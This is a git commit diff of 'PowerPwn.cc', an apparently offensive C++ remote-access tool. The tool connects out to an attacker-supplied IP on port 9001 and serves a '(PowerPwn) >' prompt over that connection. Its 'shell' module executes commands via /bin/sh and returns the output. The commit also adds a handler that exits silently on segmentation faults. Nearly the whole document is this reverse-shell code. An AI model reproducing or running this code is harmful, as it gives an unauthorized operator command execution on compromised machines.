9efae62222c731c738d8192a283fba03107d5eaa
Andromeda <eclipse0010101@gmail.com>
2023-10-14 22:44:58 -0500

    Add files via upload

--- PowerPwn.cc
+++ PowerPwn.cc
@@ -2,17 +2,20 @@
 #include <cstdlib>
 #include <cstring>
 #include <cstdint>
-#include <string>
+#include <csignal>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/utsname.h>
+
 
 #include <string>
 
 #include "includes/PowerPwn.h"
 
-uint8_t sd(void) {
+uint8_t Connection::sd(void) {
     return 0;
 }
 
@@ -21,55 +24,57 @@ void get_input(char input[BUFFER]) {
     input[strcspn(input, "\n")] = 0;
 }
 
-void new_line(void) {
+void Formatting::new_line(void) {
     std::string newline = "\n";
-    write(sd(), newline.data(), newline.length());
+    write(Connection::sd(), newline.data(), newline.length());
 }
 
-void green(void) {
+void Formatting::green(void) {
     std::string green = "\x1b[32m";
-    write(sd(), green.data(), green.length());
+    write(Connection::sd(), green.data(), green.length());
 }
 
-void red(void) {
+void Formatting::red(void) {
     std::string red = "\x1b[31m";
-    write(sd(), red.data(), red.length());
+    write(Connection::sd(), red.data(), red.length());
 }
 
-void seperator(void) {
+void Formatting::seperator(void) {
     std::string seperate = "====================================="
         "======================================\n";
-    write(sd(), seperate.data(), seperate.length());
+    write(Connection::sd(), seperate.data(), seperate.length());
 }
 
-void help(void) {
+void Modules::help(void) {
+    struct commands cmd;
     std::string cmds_list = "Commands\n";
-    std::string shell = "shell\n";
-    std::string exit = "exit\n";
-    std::string help = "help\n";
 
-    new_line();
-    green();
-    write(sd(), cmds_list.data(), cmds_list.length());
-    seperator();
-    write(sd(), shell.data(), shell.length());
-    write(sd(), exit.data(), exit.length());
-    write(sd(), help.data(), help.length());
+    cmd.shell = "shell\n";
+    cmd.exit = "exit\n";
+    cmd.help = "help\n";
+
+    Formatting::new_line();
+    Formatting::green();
+    write(Connection::sd(), cmds_list.data(), cmds_list.length());
+    Formatting::seperator();
+    write(Connection::sd(), cmd.shell.data(), cmd.shell.length());
+    write(Connection::sd(), cmd.exit.data(), cmd.exit.length());
+    write(Connection::sd(), cmd.help.data(), cmd.help.length());
 
 }
 
-void shell() {
+void Modules::shell(void) {
     std::string shell = "\x1b[31m(PowerPwn: Shell) > ";
     std::string exe = "\x1b[32mExecuting /bin/sh\n";
     std::string exits = "Type exit to return to PowerPwn.\n";
     char option[BUFFER];
     const char *errors = " 2>&0";
-    write(sd(), exe.data(), exe.length());
-    write(sd(), exits.data(), exits.length());
+    write(Connection::sd(), exe.data(), exe.length());
+    write(Connection::sd(), exits.data(), exits.length());
 
     for (;;) {
-        write(sd(), shell.data(), shell.length());
-        green();
+        write(Connection::sd(), shell.data(), shell.length());
+        Formatting::green();
         get_input(option);
 
         if (strncmp(option, "exit\0", 5) == 0) {
@@ -83,8 +88,9 @@ void shell() {
 
 int options(void) {
     struct commands *cmd = NULL;
-    char *option = new char[BUFFER];
+    char *option = NULL;
 
+    option = (char*)malloc(BUFFER);
     cmd = (commands*)malloc(sizeof(struct commands));
     get_input(option);
 
@@ -95,9 +101,9 @@ int options(void) {
     if (option == cmd->exit)
         return 1;
     else if (option == cmd->help)
-        help();
+        Modules::help();
     else if (option == cmd->shell)
-        shell();
+        Modules::shell();
 
     return 0;
 }
@@ -106,13 +112,13 @@ void main_loop(void) {
     std::string powerpwn = "(PowerPwn) > ";
 
     do {
-        red();
-        write(sd(), powerpwn.data(), powerpwn.length());
-        green();
+        Formatting::red();
+        write(Connection::sd(), powerpwn.data(), powerpwn.length());
+        Formatting::green();
     } while (options() != 1);
 }
 
-void create_connection(char ip[CMDLINE_BUFFER]) {
+void Connection::create_connection(char ip[CMDLINE_BUFFER]) {
     uint16_t port = 9001;
     const int sock = socket(AF_INET, SOCK_STREAM, 0);;
     struct sockaddr_in address;
@@ -126,10 +132,17 @@ void create_connection(char ip[CMDLINE_BUFFER]) {
 }
 
 int main(int argc, char **argv) {
+    struct sigaction sa;
+
     if (argc < 1)
         return 1;
 
-    create_connection(argv[1]);
+    memset(&sa, '\0', sizeof(sa));
+    sa.sa_sigaction = (void (*)(int, siginfo_t *, void *))&exit;
+    sa.sa_flags = SA_SIGINFO;
+    sigaction(SIGSEGV, &sa, NULL);
+    Connection::create_connection(argv[1]);
     main_loop();
+
     return 0;
 }
